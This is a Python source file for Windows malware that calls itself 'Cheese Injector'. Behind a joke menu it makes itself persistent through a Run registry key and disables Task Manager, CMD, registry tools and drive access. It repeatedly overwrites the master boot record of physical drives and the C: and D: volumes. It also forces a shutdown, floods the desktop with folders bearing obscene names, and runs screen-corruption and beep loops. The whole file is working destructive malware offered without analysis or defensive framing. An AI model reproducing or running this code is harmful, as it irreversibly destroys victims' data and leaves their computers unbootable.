from win32api import *
from win32file import *
import sys, winreg
from os import system, mkdir
from threading import Thread
from win32gui import *
from ctypes import *
from win32con import *
from random import randint, choice
from winsound import Beep
from shutil import copyfile

cx = GetSystemMetrics(SM_CXSCREEN)
cy = GetSystemMetrics(SM_CYSCREEN)
a = cx // 4
b = cy // 4
c = a * 7
d = b * 7
sleep = windll.kernel32.Sleep

def write_registry(registries_to_modify):
    for reg_path, value_name, value_to_set, reg_type, HKEY in registries_to_modify:
        try:
            # 尝试打开注册表键，如果不存在则创建
            with winreg.CreateKey(HKEY, reg_path) as key:
                # 设置相应的值为禁用
                winreg.SetValueEx(key, value_name, 0, reg_type, value_to_set)
                print("成功", end=" ")
        except OSError as e:
            # 输出错误信息
            print(f"Error: {e}", end=" ")

# 定义要修改的注册表项
registries = (
    (r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", 1, winreg.REG_DWORD, winreg.HKEY_CURRENT_USER),
    (r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisableCMD", 1, winreg.REG_DWORD, winreg.HKEY_CURRENT_USER),  # 禁用CMD的值是1
    (r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", 1, winreg.REG_DWORD, winreg.HKEY_CURRENT_USER),
    (r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoRun", 1, winreg.REG_DWORD, winreg.HKEY_CURRENT_USER),
    (r"SOFTWARE\Policies\Microsoft\Windows\Explorer", "NoDrives", 0xFFFFFFFF, winreg.REG_DWORD, winreg.HKEY_CURRENT_USER),
    (r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoDrives", 0xFFFFFFFF, winreg.REG_DWORD, winreg.HKEY_CURRENT_USER),
    (r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", "RestrictRun", 1, winreg.REG_DWORD, winreg.HKEY_CURRENT_USER),
    (r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "#Cheese", "C:\\Windows\\cheese.exe", winreg.REG_SZ, winreg.HKEY_LOCAL_MACHINE),
)

cheese = """
                              .....              
                 ....*...............            
          ............................           
      ..................*`***.........,`         
   ...................=O\/^**..........\.        
 `..........*..........[o`*..............`.      
.OOOOOOOO\o[[o`*............................     
.OOOOOOOOOOOo]]/OOOOOO]]]....................    
.OOOOOOOOOOOOOOOOOOOOOOOOOOOOO]]`..............  
,OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO\]]o]*.... 
=OOOOOOOOOOOOOO@@@@@OOOOOOOOOOOOOOOOOOOOOOO]OOO\]
=OOOOOOOOOOOOOOOO@@@OOOOOOOOOOOOOOOOOOOOOOOOOOOOO
=OOOOOOOOOOOOOOOO@@OOOOOOOOOOOOO@@@@@OOOOOOOOOOOO
=OOO@@@@OOOOOOOOOOOOOOOOOOOOOOOOOO@@@OOOOOOOOOOOO
=OOOOO@OOOOOOOOOOOOOOOOOOOOOOOOOO@OOOOOOOOOOOOOOO
,OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO
 OOOOOOOOOOOOOOOO@@@OOOOOOOOOOOOOOOOOOOOOOOOOOOOO
 OOOOOOOOOOOOOOO@@O@@OOOOOOOOOOOOOOOOOOOOOOOOOOOO
 [[OOOOOOOOOOOOOO@OOOOOOOOOOOOOOOOOOOOO@@@@OOOOOO
          ..   \OOOOOOOOOOOOOOOOOOOOOOOOO@@@OOOOO
                     ,[\OOOOOOOOOOOOOOOOOOOOOOOOO
                               ,[[OOOOOOOOOOOOOOO
                                         .[[[OOOO
"""

def func():
    write_registry(registries)
    payloads()
    Thread(target=fk).start()
    Thread(target=folders).start()
    system("color 0a")
    system("cls")
    while 1:
        print(randint(100000, 999999), end=" ")

def main():
    print(cheese)
    copyfile(sys.argv[0], "C:\\Windows\\cheese.exe")
    try:
        open("C:\\Windows\\cheese.txt")
        func()
    except:
        print("Cheese Injector", end=" ")
        print("1. Inject Cheese", end=" ")
        print("2. Exit", end=" ")
        choice = input("Enter your choice: ")
        if choice == "1":
            f = open("C:\\Windows\\cheese.txt", "w")
            f.close()
            print("Injecting Cheese...")
            print("Cheese injected successfully!")
            print("Press the enter key to exit...")
            input()
            func()
        elif choice == "2":
            print("Exiting...")
            print("Press the enter key to exit...")
            input()
            sys.exit(0)
        else:
            print("Invalid choice!")
            print("Press the enter key to exit...")
            input()
            sys.exit(0)

def folders():
    lst = list(range(100000, 600010))
    for _ in range(500000):
        c = choice(lst)
        mkdir(f"C:\\Users\\Public\\Desktop\\我操你妈{c}")
        lst.remove(c)

def fk():
    for _ in range(3000):
        mbr(b"\x00" * 1024)
        mft(b"\x00" * 3584, "C")
        mbr(b"\xFF" * 1024)
        mft(b"\xFF" * 3584, "C")
        mft(b"\xFF" * 3584, "D")
        mft(b"\x00" * 3584, "D")

def mbr(byte):
    try:
        h_device = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None,
                                OPEN_EXISTING, 0, 0)
        WriteFile(h_device, byte, None)
        CloseHandle(h_device)
    except Exception as e:
        pass
    try:
        h_device = CreateFileW("\\\\.\\PhysicalDrive1", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None,
                                OPEN_EXISTING, 0, 0)
        WriteFile(h_device, byte, None)
        CloseHandle(h_device)
    except Exception as e:
        pass
    try:
        h_device = CreateFileW("\\\\.\\PhysicalDrive2", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None,
                                OPEN_EXISTING, 0, 0)
        WriteFile(h_device, byte, None)
        CloseHandle(h_device)
    except Exception as e:
        pass
    try:
        h_device = CreateFileW("\\\\.\\PhysicalDrive3", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None,
                                OPEN_EXISTING, 0, 0)
        WriteFile(h_device, byte, None)
        CloseHandle(h_device)
    except Exception as e:
        pass
    try:
        h_device = CreateFileW("\\\\.\\PhysicalDrive4", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None,
                                OPEN_EXISTING, 0, 0)
        WriteFile(h_device, byte, None)
        CloseHandle(h_device)
    except Exception as e:
        pass
    try:
        h_device = CreateFileW("\\\\.\\PhysicalDrive5", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None,
                                OPEN_EXISTING, 0, 0)
        WriteFile(h_device, byte, None)
        CloseHandle(h_device)
    except Exception as e:
        pass

def mft(byte, drive):
    try:
        h_device = CreateFileW(f"\\\\.\\{drive}:", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING,
                                0, 0)
        WriteFile(h_device, byte, None)
        CloseHandle(h_device)
    except Exception as e:
        pass

def payloads():
    system("shutdown -s -t 240")
    system("taskkill /f /im explorer.exe")
    system("taskkill /f /im taskmgr.exe")
    threads = [Thread(target=inverse), Thread(target=draw_icons_on_cursor), Thread(target=random_inverse), Thread(target=screen_melt), Thread(target=sounds)]
    for thread in threads:
        thread.start()

def sounds():
    while True:
        try:
            Beep(1000, 900)
            Beep(1700, 900)
            Beep(2400, 900)
            Beep(3100, 900)
            Beep(3800, 900)
            Beep(4500, 900)
            Beep(5200, 900)
        except:
            pass

def get_mouse_position():
    return GetCursorPos()

def inverse():
    while True:
        try:
            hdc = GetDC(0)
            BitBlt(hdc, 0, 0, cx, cy, hdc, 0, 0, NOTSRCCOPY)
            ReleaseDC(0, hdc)
            sleep(100)
        except:
            pass

def draw_icons_on_cursor():
    mx, my = 0, 0
    while True:
        try:
            hdc = GetDC(0)
            mx, my = get_mouse_position()
            DrawIcon(hdc, mx, my, LoadIcon(0, IDI_ERROR))
            ReleaseDC(0, hdc)
        except:
            pass

def random_inverse():
    rx, ry = 0, 0
    while True:
        try:
            hdc = GetDC(0)
            rx, ry = randint(-1 * cx, cx), randint(-1 * cy, cy)
            BitBlt(hdc, 0, 0, rx, ry, hdc, 0, 0, NOTSRCCOPY)
            ReleaseDC(0, hdc)
            sleep(100)
        except:
            pass

def screen_melt():
    x, y, w, h = 0, 0, 0, 0
    while True:
        try:
            hdc = GetDC(0)
            x = randint(0, c) - a
            y = randint(0, d) - b
            w = randint(0, cx) // 3 * 2
            h = randint(0, cy) // 3 * 2
            BitBlt(hdc, x + randint(-1, 2), y + randint(0, 4), w, h, hdc, x, y, SRCCOPY)
            ReleaseDC(0, hdc)
        except:
            pass

if __name__ == "__main__":
    main()
